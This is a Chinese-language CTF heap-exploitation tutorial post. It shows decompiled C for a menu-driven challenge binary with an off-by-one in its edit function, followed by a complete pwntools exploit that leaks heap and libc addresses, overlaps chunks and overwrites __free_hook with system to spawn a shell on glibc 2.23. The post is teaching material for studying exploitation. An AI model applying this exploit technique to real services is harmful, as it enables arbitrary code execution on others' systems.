---
title: 从零开始的堆利用 03
published: 2026-10-26
description: 'off-by-one 与 fake chunk '
image: ''
tags:
  - pwn
  - glibc
category: Heap
draft: true
lang: zh_CN
---

# 从零开始的堆利用 03

## 逆向

修出下面结构体

```c
struct chunk
{
  size_t size;
  char *dataptr;
};
```

修复后源码如下

```c
unsigned __int64 create_heap()
{
  chunk *v0; // rbx
  int i; // [rsp+4h] [rbp-2Ch]
  size_t size; // [rsp+8h] [rbp-28h]
  char buf[8]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !heaparray[i] )
    {
      heaparray[i] = (chunk *)malloc(0x10u);
      if ( !heaparray[i] )
      {
        puts("Allocate Error");
        exit(1);
      }
      printf("Size of Heap : ");
      read(0, buf, 8u);
      size = atoi(buf);
      v0 = heaparray[i];
      v0->dataptr = malloc(size);
      if ( !heaparray[i]->dataptr )
      {
        puts("Allocate Error");
        exit(2);
      }
      heaparray[i]->size = size;
      printf("Content of heap:");
      read_input(heaparray[i]->dataptr, size);
      puts("SuccessFul");
      return __readfsqword(0x28u) ^ v5;
    }
  }
  return __readfsqword(0x28u) ^ v5;
}

unsigned __int64 edit_heap()
{
  unsigned int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 >= 0xA )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( heaparray[v1] )
  {
    printf("Content of heap : ");
    read_input(heaparray[v1]->dataptr, heaparray[v1]->size + 1);// off-by-one
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}

unsigned __int64 show_heap()
{
  unsigned int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 >= 0xA )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( heaparray[v1] )
  {
    printf("Size : %ld\nContent : %s\n", heaparray[v1]->size, heaparray[v1]->dataptr);
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}

unsigned __int64 delete_heap()
{
  unsigned int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 >= 0xA )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( heaparray[v1] )
  {
    free(heaparray[v1]->dataptr);
    free(heaparray[v1]);
    heaparray[v1] = 0;
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}

int main(int argc, const char **argv, const char **envp)
{
  char buf[8]; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 canary; // [rsp+8h] [rbp-8h]

  canary = __readfsqword(0x28u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  while ( 1 )
  {
    menu();
    read(0, buf, 4u);
    switch ( atoi(buf) )
    {
      case 1:
        create_heap();
        break;
      case 2:
        edit_heap();
        break;
      case 3:
        show_heap();
        break;
      case 4:
        delete_heap();
        break;
      case 5:
        exit(0);
      default:
        puts("Invalid Choice");
        break;
    }
  }
}
```

## 分析

存在 off-by-one 漏洞



## EXP

```python
from pwn import *
context(arch='amd64', log_level='info', os='linux')

# glibc 2.23 no PIE
# off by one -> heap over lapping -> edit dataptr ->free hook 


io = process('./pwn')
# io = remote('', )

libc=ELF('./libc-2.23.so')

def menu(choice):
    io.sendlineafter(b'',str(choice).encode())

def add(size,data):
    menu(1)
    io.sendlineafter("Size of Heap : ",str(size).encode())
    io.sendafter("Content of heap:",data)

def delete(id):
    menu(4)
    io.sendlineafter("Index :",str(id).encode())

def show(id):
    menu(3)
    io.sendlineafter("Index :",str(id).encode())

def edit(id,data):
    menu(2)
    io.sendlineafter("Index :",str(id).encode())
    io.sendafter("heap : ",data)

def leak(data, n) -> int:
    io.recvuntil(data)
    leak = u64(io.recv(n).ljust(8, b'\x00'))
    return leak

g = '''break *0x400D76
c
'''

add(0x18,b'/bin/sh\x00')     # 0
add(0x108,b'B'*0x10)    # 1
add(0x100,b'C'*0x8)     # 2
add(0x18,b'D'*0x10)     # 3
delete(2)
delete(1)

add(0x108,b'B'*0x8)
show(1)
heap_leak = leak(b'B'*0x8,4)
heap_base = heap_leak-0x60
log.success(f"heap -> {hex(heap_base)}")

add(0x100,b'C'*0x8)
show(2)
libc_base = leak(b'C'*0x8,6) - 0x3c4b78
log.success(f"libc -> {hex(libc_base)}")
libc.address=libc_base
system_addr=libc.symbols['system']
free__hook=libc.symbols['__free_hook']
log.info(f"system -> {hex(system_addr)}")
log.info(f"__free_hook -> {hex(free__hook)}")

gdb.attach(io,g)

add(0x18,b'E'*8)
add(0x80,b'F'*8)
add(0x80,b'G'*8)

payload=b'd'*0x18+p8(0xf1)
edit(3,payload)
delete(4)
payload=p64(0)*3+p64(0x21)+p64(0x1000)+p64(free__hook)
add(0x58,payload)       # 4
edit(4,p64(system_addr))

delete(0)


io.interactive()

```
